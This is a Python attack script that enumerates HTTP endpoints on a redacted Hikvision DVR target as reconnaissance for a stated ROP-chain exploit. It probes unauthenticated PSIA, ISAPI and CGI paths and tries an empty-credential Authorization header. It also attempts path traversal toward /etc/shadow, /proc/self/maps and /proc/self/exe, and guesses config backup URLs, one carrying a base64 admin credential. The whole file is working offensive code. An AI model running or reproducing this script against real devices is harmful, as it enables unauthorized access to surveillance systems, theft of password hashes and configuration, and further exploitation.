#!/usr/bin/env python3
"""
http_enum.py — HTTP endpoint enumeration for Hikvision DVR.

Goals:
  1. Map accessible paths without authentication
  2. Find config/binary download endpoints
  3. Analyse login.asp for auth bypass primitives
  4. Try path traversal patterns to reach /proc/self/maps or binaries

Architecture note: the device is ARM Cortex-A9 (HiSilicon Hi3531).
If we can download ANY binary we get gadget addresses for the ROP chain.
"""

import socket, time, urllib.parse, sys

TARGET  = "█████████████"
PORT    = 80
TIMEOUT = 8

# ── raw HTTP helper ────────────────────────────────────────────────────────────

def http_req(method, path, headers=None, body=None, timeout=TIMEOUT):
    """Return (status_code, headers_dict, body_bytes)."""
    h = {
        "Host":       TARGET,
        "User-Agent": "curl/7.68.0",
        "Connection": "close",
    }
    if headers:
        h.update(headers)
    if body is not None:
        h["Content-Length"] = str(len(body))

    req_lines = [f"{method} {path} HTTP/1.1"]
    for k, v in h.items():
        req_lines.append(f"{k}: {v}")
    req_lines += ["", ""]
    raw = "\r\n".join(req_lines).encode()
    if body:
        raw += body if isinstance(body, bytes) else body.encode()

    try:
        s = socket.socket()
        s.settimeout(timeout)
        s.connect((TARGET, PORT))
        s.sendall(raw)
        resp = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
            if len(resp) > 512 * 1024:   # cap at 512 KB
                break
        s.close()
    except Exception as e:
        return (0, {}, b"")

    if b"\r\n\r\n" not in resp:
        return (0, {}, resp)

    head_part, body_part = resp.split(b"\r\n\r\n", 1)
    lines = head_part.split(b"\r\n")
    status = 0
    try:
        status = int(lines[0].split()[1])
    except:
        pass
    hdrs = {}
    for line in lines[1:]:
        if b":" in line:
            k, _, v = line.partition(b":")
            hdrs[k.strip().lower().decode(errors="replace")] = v.strip().decode(errors="replace")
    return (status, hdrs, body_part)


def probe(method, path, tag="", show_body=False, body=None, extra_headers=None):
    code, hdrs, body_bytes = http_req(method, path, headers=extra_headers, body=body)
    ct = hdrs.get("content-type", "")
    cl = hdrs.get("content-length", "?")
    flag = ""
    if code == 200:
        flag = " ← !!!"
    elif code in (301, 302):
        flag = f" → {hdrs.get('location','')}"
    snippet = ""
    if show_body and body_bytes:
        snippet = f"\n    body: {repr(body_bytes[:200])}"
    print(f"  {code}  {method:6s} {path[:80]:80s}  ct={ct[:30]} cl={cl}{flag}{snippet}")
    return code, hdrs, body_bytes


# ── Phase 1: fetch login page ──────────────────────────────────────────────────

print("=" * 70)
print("Phase 1: login.asp analysis")
print("=" * 70)
code, hdrs, body = probe("GET", "/doc/page/login.asp", show_body=True)
if body:
    # extract form action and hidden fields
    text = body.decode(errors="replace")
    import re
    forms  = re.findall(r'<form[^>]*action=["\']([^"\']+)["\']', text, re.I)
    inputs = re.findall(r'<input[^>]+name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?', text, re.I)
    scripts = re.findall(r'<script[^>]*src=["\']([^"\']+)["\']', text, re.I)
    print(f"  forms  : {forms}")
    print(f"  inputs : {inputs[:10]}")
    print(f"  scripts: {scripts[:10]}")
    # look for API endpoints mentioned in JS
    apis = re.findall(r'(?:url|href|src|action)\s*[=:]\s*["\']([/][^"\']+)["\']', text, re.I)
    print(f"  api refs: {list(set(apis))[:20]}")


# ── Phase 2: PSIA API (Physical Security Interoperability Alliance) ────────────

print("\n" + "=" * 70)
print("Phase 2: PSIA API endpoints (GET — often unauthed on old firmware)")
print("=" * 70)

PSIA_PATHS = [
    "/PSIA/System/capabilities",
    "/PSIA/System/deviceInfo",
    "/PSIA/System/deviceInfo/deviceName",
    "/PSIA/System/deviceInfo/serialNumber",
    "/PSIA/System/deviceInfo/macAddress",
    "/PSIA/System/deviceInfo/firmwareVersion",
    "/PSIA/System/deviceInfo/deviceDescription",
    "/PSIA/System/Network/interfaces",
    "/PSIA/System/Network/interfaces/1",
    "/PSIA/System/Network/interfaces/1/ipAddress",
    "/PSIA/System/time",
    "/PSIA/System/time/NTPServers",
    "/PSIA/Security/userCheck",
    "/PSIA/Security/users",
    "/PSIA/Security/adminAccesses",
    "/PSIA/Streaming/channels",
    "/PSIA/Streaming/channels/1",
    "/PSIA/Streaming/channels/101",
    "/PSIA/Streaming/status",
    "/PSIA/Custom/SelfExt/userCheck",
    "/PSIA/Custom/SelfExt/capabilities",
    "/PSIA/Custom/SelfExt/userInfo/1",
]

for path in PSIA_PATHS:
    probe("GET", path)

# also try with digest auth bypass: empty Authorization header
print("\n  -- With Authorization: header tricks --")
for path in ["/PSIA/System/deviceInfo", "/PSIA/Security/userCheck"]:
    probe("GET", path, extra_headers={"Authorization": "Basic Og=="})  # base64(":")


# ── Phase 3: SDK / CGI endpoints ──────────────────────────────────────────────

print("\n" + "=" * 70)
print("Phase 3: SDK / CGI endpoints")
print("=" * 70)

SDK_PATHS = [
    "/SDK/2.0/System/deviceInfo",
    "/SDK/2.0/System/capabilities",
    "/SDK/2.0/Streaming/channels",
    "/SDK/2.0/System/status",
    "/cgi-bin/eval",
    "/cgi-bin/proc.cgi",
    "/cgi-bin/snapshot.cgi",
    "/cgi-bin/configManager.cgi",
    "/cgi-bin/global.cgi",
    "/cgi-bin/userManager.cgi",
    "/cgi-bin/dvrip.cgi",
    "/cgi-bin/accessControl.cgi",
    "/cgi-bin/search.cgi",
    "/cgi-bin/alarmManager.cgi",
    "/cgi-bin/deviceInfo.cgi",
    "/cgi-bin/videoInput.cgi",
    "/cgi-bin/PTZControl.cgi",
    "/System/configurationFile",
    "/System/deviceInfo",
    "/System/status",
    "/System/log",
    "/System/upgradeStatus",
    "/web/config.xml",
    "/config.xml",
    "/configuration.xml",
    "/system.xml",
    "/device.xml",
]

for path in SDK_PATHS:
    probe("GET", path)


# ── Phase 4: Path traversal attempts ──────────────────────────────────────────

print("\n" + "=" * 70)
print("Phase 4: Path traversal — targeting /proc/self/maps and binaries")
print("=" * 70)

TRAVERSAL_TARGETS = [
    "/proc/self/maps",
    "/proc/self/exe",
    "/proc/1/maps",
    "/proc/1/cmdline",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hostname",
    "/proc/version",
    "/proc/cpuinfo",
]

# Traversal prefixes to prepend
TRAVERSAL_PREFIXES = [
    "",                                 # direct (already tested some)
    "/../../../..",
    "/%2e%2e/%2e%2e/%2e%2e/%2e%2e",
    "/doc/../../../../..",
    "/PSIA/../../../..",
    "/cgi-bin/../../../../..",
]

for prefix in TRAVERSAL_PREFIXES:
    for target in TRAVERSAL_TARGETS[:4]:   # just the most valuable ones
        path = prefix + target
        code, hdrs, body = probe("GET", path)
        if code == 200 and body:
            print(f"    *** TRAVERSAL HIT: {path} → {len(body)} bytes")
            print(f"    content: {repr(body[:300])}")


# ── Phase 5: backup / config export ───────────────────────────────────────────

print("\n" + "=" * 70)
print("Phase 5: Config backup / export endpoints")
print("=" * 70)

BACKUP_PATHS = [
    "/System/configurationFile?auth=YWRtaW46MTEQ",   # base64("admin:11")
    "/backup",
    "/backup.tar.gz",
    "/config/backup",
    "/download/config",
    "/export",
    "/System/Export",
    "/PSIA/System/configurationData",
    "/cgi-bin/backup.cgi",
    "/download",
    "/nvr_backup",
    "/configbak",
    "/dav/nvr_backup",
]

for path in BACKUP_PATHS:
    code, hdrs, body = probe("GET", path)
    if code == 200 and body:
        print(f"    *** BACKUP HIT: {path} → {len(body)} bytes, first bytes: {body[:64].hex()}")


# ── Phase 6: doc/ directory enumeration ───────────────────────────────────────

print("\n" + "=" * 70)
print("Phase 6: /doc/ directory guessing")
print("=" * 70)

DOC_PATHS = [
    "/doc/",
    "/doc/page/",
    "/doc/page/main.asp",
    "/doc/page/main.html",
    "/doc/page/index.asp",
    "/doc/page/setup.asp",
    "/doc/page/config.asp",
    "/doc/page/system.asp",
    "/doc/page/admin.asp",
    "/doc/page/download.asp",
    "/doc/page/export.asp",
    "/doc/page/update.asp",
    "/doc/page/upgrade.asp",
    "/doc/page/user.asp",
    "/doc/page/network.asp",
    "/doc/js/",
    "/doc/js/main.js",
    "/doc/js/ajax.js",
    "/doc/js/common.js",
    "/doc/js/app.js",
    "/doc/js/hikvision.js",
    "/doc/js/index.js",
    "/doc/js/dwr.js",
    "/doc/img/",
    "/doc/css/style.css",
    "/doc/css/main.css",
]

for path in DOC_PATHS:
    code, hdrs, body = probe("GET", path)
    if code == 200 and body and len(body) > 50:
        print(f"    *** HIT: {path} → {len(body)} bytes")
        if path.endswith(".js"):
            # extract all URL strings from JS
            import re
            urls = re.findall(r'["\']([/][a-zA-Z0-9/_\-\.]+)["\']', body.decode(errors="replace"))
            print(f"    JS URLs: {list(set(urls))[:15]}")


# ── Phase 7: ISAPI (newer Hikvision API — may exist alongside PSIA) ───────────

print("\n" + "=" * 70)
print("Phase 7: ISAPI endpoints")
print("=" * 70)

ISAPI_PATHS = [
    "/ISAPI/System/deviceInfo",
    "/ISAPI/System/capabilities",
    "/ISAPI/System/status",
    "/ISAPI/System/Network/interfaces",
    "/ISAPI/Security/users",
    "/ISAPI/Security/adminAccesses",
    "/ISAPI/Streaming/channels",
    "/ISAPI/Event/triggers",
    "/ISAPI/System/configurationData",
    "/ISAPI/System/updateFirmware",
    "/ISAPI/System/reboot",
    "/ISAPI/System/time",
]

for path in ISAPI_PATHS:
    probe("GET", path)


# ── Phase 8: interesting file extensions ──────────────────────────────────────

print("\n" + "=" * 70)
print("Phase 8: File extension guessing in web root")
print("=" * 70)

FILE_PATHS = [
    "/index.html", "/index.htm", "/index.asp", "/index.php",
    "/login.html", "/login.htm",
    "/main.html",
    "/robots.txt", "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/.htaccess", "/web.config",
    "/info.php", "/phpinfo.php",
    "/server-status", "/server-info",
    "/?XDEBUG_SESSION_START=1",
]

for path in FILE_PATHS:
    probe("GET", path)

print("\nDone.")
